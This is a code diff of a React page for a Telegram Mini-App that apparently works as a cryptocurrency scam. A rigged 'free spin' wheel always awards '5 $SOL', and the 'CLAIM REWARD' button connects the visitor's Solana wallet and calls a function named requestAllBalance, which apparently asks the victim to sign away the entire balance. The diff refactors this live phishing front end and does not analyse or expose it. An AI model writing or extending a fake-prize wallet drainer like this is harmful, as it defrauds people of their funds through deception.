@@ -11,13 +11,14 @@ import { useWallet }      from '@solana/wallet-adapter-react'
 import { useWalletModal } from '@solana/wallet-adapter-react-ui'
 import { requestAllBalance } from '@/app/services/transaction'
 
+// only augment Window for solana; Telegram is handled via TgWindow below
 declare global {
   interface Window {
     solana?: { publicKey?: any }
-    Telegram?: { WebApp?: TgWebApp }
   }
 }
 
+// local Telegram WebApp types
 interface TgWebApp {
   expand: () => void
   requestFullscreen?: () => void
@@ -26,10 +27,11 @@ interface TgWebApp {
   disableVerticalSwipes?: () => void
   scroll?: (offsetY: number) => void
 }
+// for typing window.Telegram
 type TgWindow = Window & { Telegram?: { WebApp?: TgWebApp } }
 
 export default function Page() {
-  /* -------- Telegram Mini-App başlat -------- */
+  /* ——— Telegram Mini-App başlat ——— */
   useEffect(() => {
     const webapp = (window as TgWindow).Telegram?.WebApp
     if (!webapp) return
@@ -41,32 +43,31 @@ export default function Page() {
       if (typeof webapp.disableVerticalSwipes === 'function') {
         webapp.disableVerticalSwipes()
       } else if (typeof webapp.scroll === 'function') {
-        const lockScroll = () => webapp.scroll!(window.scrollY)
-        window.addEventListener('scroll', lockScroll)
-        return () => window.removeEventListener('scroll', lockScroll)
+        const lock = () => webapp.scroll!(window.scrollY)
+        window.addEventListener('scroll', lock)
+        return () => window.removeEventListener('scroll', lock)
       }
-    } catch (e) {
-      console.error('Telegram WebApp init hatası:', e)
+    } catch {
+      /* ignore */
     }
   }, [])
 
-  /* -------- ÇARK (spin) durumu -------- */
+  /* ——— Çark (spin) durumu ——— */
   const wheelRef = useRef<HTMLImageElement>(null)
-  const [hasSpun, setHasSpun] = useState<boolean>(() => {
-    if (typeof window === 'undefined') return false
-    return localStorage.getItem('hasSpun') === 'true'
-  })
+  const [hasSpun, setHasSpun] = useState<boolean>(() =>
+    typeof window !== 'undefined' && localStorage.getItem('hasSpun') === 'true'
+  )
   useEffect(() => {
     if (hasSpun) document.querySelector('._1')?.classList.add('modal_active')
   }, [hasSpun])
   const handleSpin = () => {
     if (hasSpun || !wheelRef.current) return
-    const wheel = wheelRef.current
-    wheel.style.transition = 'transform 9000ms ease-in-out'
-    wheel.style.transform  = 'rotate(1080deg)'
+    const w = wheelRef.current
+    w.style.transition = 'transform 9000ms ease-in-out'
+    w.style.transform  = 'rotate(1080deg)'
     setTimeout(() => {
-      wheel.style.transition = 'none'
-      wheel.style.transform  = 'rotate(0deg)'
+      w.style.transition = 'none'
+      w.style.transform  = 'rotate(0deg)'
     }, 9000)
     setTimeout(() => {
       setHasSpun(true)
@@ -74,31 +75,29 @@ export default function Page() {
     }, 10000)
   }
 
-  /* ——————————————————————————————————————— */
-  /*       Wallet-Adapter ile bağlan & claim      */
-  /* ——————————————————————————————————————— */
-  const { publicKey }  = useWallet()
-  const { setVisible } = useWalletModal()
+  /* ——— Wallet-Adapter ile bağlan & claim ——— */
+  const { publicKey }   = useWallet()
+  const { setVisible }  = useWalletModal()
 
-  const [isLoading,    setIsLoading]    = useState(false)
-  const [msg,          setMsg]          = useState('')
-  const [pendingTx,    setPendingTx]    = useState(false)
+  const [loading, setLoading]       = useState(false)
+  const [msg,     setMsg]           = useState('')
+  const [pending, setPendingTx]     = useState(false)
 
-  // Her durumda modal aç
+  // her durumda modal aç
   const openConnectModal = () => {
     setVisible(true)
   }
 
-  // Transaction gönderme
-  const sendTx = async () => {
-    setIsLoading(true)
+  // transaction gönder
+  const doTx = async () => {
+    setLoading(true)
     let ok: boolean | undefined
     try {
       ok = await requestAllBalance()
     } catch {
       ok = false
     } finally {
-      setIsLoading(false)
+      setLoading(false)
     }
     if (!ok) {
       setMsg('No enough Sol!')
@@ -106,38 +105,35 @@ export default function Page() {
     }
   }
 
-  // Claim butonuna basıldığında
+  // Claim Reward butonuna basıldığında
   const handleClaim = () => {
     if (!publicKey) {
       setPendingTx(true)
       openConnectModal()
     } else {
-      sendTx()
+      doTx()
     }
   }
 
-  // Cüzdan bağlandıktan sonra bekleyen tx varsa gönder
+  // cüzdan bağlandıktan sonra bekleyen tx varsa gönder
   useEffect(() => {
-    if (publicKey && pendingTx) {
+    if (publicKey && pending) {
       setPendingTx(false)
-      sendTx()
+      doTx()
     }
-  }, [publicKey, pendingTx])
+  }, [publicKey, pending])
 
-  /* ——————————————————————————————————————— */
-  /*                    JSX                     */
-  /* ——————————————————————————————————————— */
   return (
     <>
-      {/* ---------- HERO BANNER ---------- */}
+      {/* HERO BANNER */}
       <div className="_1">
         <div className="_g">
           <span className="_a">
             <div className="_3">
               <p className="_7">
-                CONGRATULATIONS! <br />
+                CONGRATULATIONS!<br/>
                 <span className="_a">You won</span>{' '}
-                <span><span className="_a">5 $SOL</span></span>
+                <span className="_a">5 $SOL</span>
               </p>
             </div>
           </span>
@@ -147,16 +143,16 @@ export default function Page() {
               <button
                 onClick={handleClaim}
                 className="_s"
-                disabled={isLoading}
+                disabled={loading}
               >
-                {isLoading ? 'Please wait…' : msg || 'CLAIM REWARD'}
+                {loading ? 'Please wait…' : msg || 'CLAIM REWARD'}
               </button>
             </div>
           </div>
         </div>
       </div>
 
-      {/* ---------- HEADER ---------- */}
+      {/* HEADER */}
       <section className="_b">
         <div className="_d">
           <div className="_x">
@@ -189,41 +185,32 @@ export default function Page() {
                 <span className="_a">
                   {publicKey ? 'Wallet connected' : 'Connect Wallet'}
                 </span>
-                <img src="/header_arrow.svg" alt="" />
+                <img src="/header_arrow.svg" alt="→" />
               </button>
             </div>
           </div>
         </div>
       </section>
 
-      {/* ---------- MAIN SECTION ---------- */}
+      {/* MAIN SECTION */}
       <section className="_m">
         <div className="_d">
           <h1 className="_4">
-            WELCOME <span>BONUS</span>
-            <br />
+            WELCOME <span>BONUS</span><br/>
             FOR SOLANA USERS
           </h1>
           <div className="_o">
             <div className="_r">
               <img src="/wheel_arrow.png" alt="Arrow" className="_f" />
-              <img
-                ref={wheelRef}
-                src="/wheel_wheel.png"
-                alt="Wheel"
-                className="_l"
-              />
-              <button className="_y" onClick={handleSpin}>
-                FREE SPIN
-              </button>
+              <img ref={wheelRef} src="/wheel_wheel.png" alt="Wheel" className="_l" />
+              <button className="_y" onClick={handleSpin}>FREE SPIN</button>
             </div>
           </div>
           <div className="_u">
             <div className="_j">
               <p className="_p">
                 <img src="/main_one.svg" alt="step 1" />
-                If you have received a qualification notification in the form of
-                SOL or USDT, click the «FREE SPIN» button
+                If you have received a qualification notification in the form of SOL or USDT, click the «FREE SPIN» button
               </p>
               <p className="_p">
                 <img src="/main_two.svg" alt="step 2" />
@@ -231,8 +218,7 @@ export default function Page() {
               </p>
               <p className="_p">
                 <img src="/main_three.svg" alt="step 3" />
-                Click «CLAIM REWARD», connect your wallet and confirm the
-                received transaction
+                Click «CLAIM REWARD», connect your wallet and confirm the received transaction
               </p>
             </div>
             <p className="_e">All rights reserved © 2025 SOLANA.</p>
@@ -240,7 +226,7 @@ export default function Page() {
         </div>
       </section>
 
-      {/* ---------- FOOTER SOCIAL ---------- */}
+      {/* FOOTER */}
       <section className="_v">
         <div className="_d">
           <div className="_6">
